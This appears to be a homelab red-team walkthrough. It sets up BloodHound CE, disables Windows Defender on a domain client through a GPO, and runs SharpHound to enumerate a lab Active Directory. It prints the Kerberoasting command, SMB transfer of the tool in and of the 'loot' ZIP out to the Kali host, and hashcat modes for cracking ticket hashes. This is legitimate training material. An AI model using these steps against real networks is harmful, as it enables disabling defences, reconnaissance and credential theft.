# 12 - BloodHound CE Setup & SharpHound Collection

## Overview

This document covers the installation and configuration of BloodHound Community Edition (CE) on Kali Linux, the disabling of Windows Defender on CLIENT01 via GPO from DC01, and the execution of SharpHound to collect Active Directory enumeration data.

**Environment:**
- Kali Linux attacker: `10.10.10.100`
- DC01 (Windows Server 2025): `10.10.10.10`
- CLIENT01 (Windows 11 Pro): `10.10.10.50`
- Domain: `homelab.local` | NetBIOS: `HOMELAB`

---

## Phase 1 — Tool Versions Verified

Before starting, confirm all required components are installed on Kali.

```bash
# BloodHound CE version
bloodhound --version

# Neo4j version
neo4j --version

# SharpHound (check file)
ls /usr/share/sharphound/SharpHound.exe

# impacket (for SMB file transfer)
impacket-smbserver --help
```

![Tool versions verified](screenshots/bloodhound-01-versions-verified.png)

**Versions used:**
- BloodHound CE: `9.1.0`
- Neo4j: `4.4.26`
- SharpHound: `2.12.0`
- bloodhound-python: `1.9.0`

---

## Phase 2 — Neo4j Setup

BloodHound CE requires Neo4j as its graph database backend.

### Start Neo4j

```bash
sudo neo4j start
```

![Neo4j started](screenshots/bloodhound-02-setup-neo4j-started.png)

### Access Neo4j Browser (initial password change)

Navigate to `http://127.0.0.1:7474` in Firefox.

![Neo4j browser port 7474](screenshots/bloodhound-03-neo4j-browser-7474.png)

Connect using default credentials (`neo4j` / `neo4j`), then change the password when prompted.

![Neo4j browser connect form](screenshots/bloodhound-08-neo4j-browser-connect-form.png)

![Neo4j password change](screenshots/bloodhound-09-neo4j-password-change.png)

![Neo4j connected success](screenshots/bloodhound-10-neo4j-connected-success.png)

### Troubleshooting: Password Mismatch

If BloodHound CE fails to connect to Neo4j due to a password mismatch, edit the BloodHound API config:

```bash
sudo nano /etc/bloodhound/bloodhound.json
```

Update the `neo4j_connection` password field to match the Neo4j password set above.

![bhapi.json in nano](screenshots/bloodhound-04-bhapi-json-nano.png)

![bhapi.json updated](screenshots/bloodhound-05-bhapi-json-updated.png)

Then reset and restart both services:

```bash
sudo neo4j restart
sudo bloodhound-ce restart   # or the relevant systemd unit
```

![Fix: reset and restart](screenshots/bloodhound-06-fix-reset-and-restart.png)

![Fix: terminal neo4j setup](screenshots/bloodhound-07-fix-terminal-neo4j-setup.png)

---

## Phase 3 — BloodHound CE Startup

### Start BloodHound CE

```bash
sudo bloodhound-ce start
# or
cd /opt/bloodhound && sudo ./bloodhound &
```

BloodHound CE listens on `http://127.0.0.1:8080`.

![BloodHound CE started on port 8080](screenshots/bloodhound-11-bhapi-updated-bh-started-8080.png)

### RAM Note

BloodHound CE + Neo4j is memory-intensive. Kali was configured with 8 GB RAM for this phase.

![RAM before: 8GB tight](screenshots/bloodhound-15-ram-before-8gb-tight.png)

![Kali VMware 8GB settings](screenshots/bloodhound-16-kali-vmware-8gb-settings.png)

![BloodHound started with 8GB OK](screenshots/bloodhound-17-bloodhound-started-8gb-ok.png)

### First Login

Navigate to `http://127.0.0.1:8080` and log in with the BloodHound admin credentials.

![BloodHound CE login page](screenshots/bloodhound-12-bh-ce-login-page.png)

![BloodHound CE manage users](screenshots/bloodhound-13-bh-ce-manage-users.png)

![BloodHound CE profile password changed](screenshots/bloodhound-14-bh-ce-profile-password-changed.png)

---

## Phase 4 — Disable Windows Defender on CLIENT01 via GPO

SharpHound is detected and blocked by Windows Defender. The solution is to disable Defender via Group Policy from DC01, rather than manually on the endpoint.

### Step 1 — Verify Domain State (Kali)

From Kali, confirm SPN configuration, GPO status, and LDAP connectivity before proceeding.

```bash
nmap -p 389,636,3268 10.10.10.10
impacket-GetUserSPNs homelab.local/alice.rossi:Password123! -dc-ip 10.10.10.10
```

![Kali: verify SharpHound, nmap, impacket](screenshots/bh-08-kali-verify-sharphound-nmap-impacket.png)

![DC01: verify domain, SPN, GPO, LDAP](screenshots/bh-09-dc01-verify-domain-spn-gpo-ldap.png)

### Step 2 — Disable Tamper Protection on CLIENT01

Tamper Protection must be disabled manually before GPO can override Defender settings.

On CLIENT01, go to: **Windows Security → Virus & threat protection → Manage settings → Tamper Protection → Off**

![CLIENT01: Tamper Protection disabled](screenshots/bh-12-client01-tamper-protection-disabled.png)

### Step 3 — Create GPO on DC01

On DC01, open **Group Policy Management** and create a new GPO linked to the domain or the CLIENT01 OU.

Navigate to:
`Computer Configuration → Administrative Templates → Windows Components → Microsoft Defender Antivirus`

Set **Turn off Microsoft Defender Antivirus** → **Enabled**

![DC01: GPO Defender dialog enabled](screenshots/bh-13-dc01-gpo-defender-dialog-enabled.png)

![DC01: GPO Defender confirmed enabled](screenshots/bh-14-dc01-gpo-defender-confirmed-enabled.png)

### Step 4 — Apply GPO and Verify

Run `gpupdate /force` on DC01, then verify the policy pushed correctly:

```powershell
gpupdate /force
Get-MpPreference | Select-Object DisableRealtimeMonitoring, DisableAntiSpyware
```

![DC01: gpupdate — Defender false/false](screenshots/bh-15-dc01-gpupdate-defender-false-false.png)

On CLIENT01, verify GPO was received:

```powershell
gpupdate /force
gpresult /r
Get-MpPreference | Select-Object DisableRealtimeMonitoring, DisableAntiSpyware
```

![CLIENT01: GPO local dialog enabled](screenshots/bh-16-client01-gpo-local-dialog-enabled.png)

![CLIENT01: GPO local confirmed enabled](screenshots/bh-17-client01-gpo-local-confirmed-enabled.png)

### Step 5 — Registry Verification

Confirm registry keys reflect the Defender disable state:

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name DisableRealtimeMonitoring
```

![CLIENT01: registry DisableAntiSpyware](screenshots/bh-01-client01-registry-disableantispyware.png)

![CLIENT01: registry RealtimeProtection](screenshots/bh-02-client01-registry-realtimeprotection.png)

**Note:** Even with GPO applied, `Get-MpPreference` may still report `True` for some fields before reboot. The registry keys are the authoritative source.

![CLIENT01: Defender false/true pre-reboot](screenshots/bh-03-client01-defender-false-true-pre-reboot.png)

![CLIENT01: Defender post-GPO true/true](screenshots/bh-18-client01-defender-post-gpo-true-true.png)

![CLIENT01: Defender post-GPO still true](screenshots/bh-19-client01-defender-post-gpo-still-true.png)

After reboot, verify full domain state on CLIENT01:

![CLIENT01: verify domain, Defender, gpresult](screenshots/bh-10-client01-verify-domain-defender-gpresult.png)

---

## Phase 5 — SharpHound Collection

### Transfer SharpHound to CLIENT01

From Kali, start an SMB server to serve the SharpHound binary:

```bash
sudo impacket-smbserver share /usr/share/sharphound/ -smb2support
```

On CLIENT01 (as `alice.rossi`), copy SharpHound from the SMB share:

```cmd
copy \\10.10.10.100\share\SharpHound.exe C:\Users\alice.rossi\Desktop\
```

**Note:** If the SMB share is not reachable, verify the impacket-smbserver is running and Windows Firewall allows inbound SMB on Kali.

![CLIENT01: SMB copy error — no share](screenshots/bh-20-client01-smb-copy-error-no-share.png)

### Run SharpHound

On CLIENT01, open PowerShell as `alice.rossi` (domain user) and run:

```powershell
cd C:\Users\alice.rossi\Desktop
.\SharpHound.exe -c All --zipfilename homelab_collection.zip
```

![CLIENT01: SharpHound run start](screenshots/bh-04-client01-sharphound-run-start.png)

![CLIENT01: SharpHound completed — zip transferred](screenshots/bh-05-client01-sharphound-completed-zip-transferred.png)

![CLIENT01: SharpHound completed detail](screenshots/bh-06-client01-sharphound-completed-detail.png)

**Collection result:** 316 objects collected across the `homelab.local` domain.

### Transfer ZIP to Kali

From Kali, start the SMB server pointing to the loot directory:

```bash
mkdir -p /tmp/bh-loot
sudo impacket-smbserver share /tmp/bh-loot -smb2support -username kaliuser -password kaliuser
```

On CLIENT01:

```cmd
copy C:\Users\alice.rossi\Desktop\*.zip \\10.10.10.100\share\
```

On Kali, verify the ZIP arrived:

```bash
ls -lh /tmp/bh-loot/
```

![Kali: BloodHound smbserver — ZIP received](screenshots/bh-25-kali-bloodhound-smbserver-zip-received.png)

---

## Phase 6 — Import into BloodHound CE

### Upload ZIP

In the BloodHound CE web UI (`http://127.0.0.1:8080`):

1. Click **Upload Data** (top right)
2. Select the ZIP file from `/tmp/bh-loot/`
3. Wait for ingestion to complete

![BloodHound: upload file picker ZIP](screenshots/bh-31-bloodhound-upload-file-picker-zip.png)

![BloodHound: upload ZIP ready](screenshots/bh-21-kali-bloodhound-upload-zip-ready.png)

![BloodHound: upload success — ingest](screenshots/bh-28-bloodhound-upload-success-ingest.png)

BloodHound CE UI is now populated with the `homelab.local` domain graph. Proceed to `red-team/05-bloodhound-ad-enumeration.md` for analysis.

---

## Notes

- SharpHound `2.12.0` with `-c All` collects: Sessions, ACLs, ObjectProperties, Trusts, Containers, GPO, LocalAdminRights, RDP, DCOM, PSRemote.
- AES-256 (etype 18) TGS hashes require hashcat mode `19700`, not `13100` (RC4). Using the wrong mode causes silent failure.
- bloodhound-python was blocked by LDAP signing enforcement on Windows Server 2025 — SharpHound from a domain-joined host was the working alternative.
- The `--force` flag in hashcat bypasses the wordlist-too-small warning; it does not affect cracking accuracy.
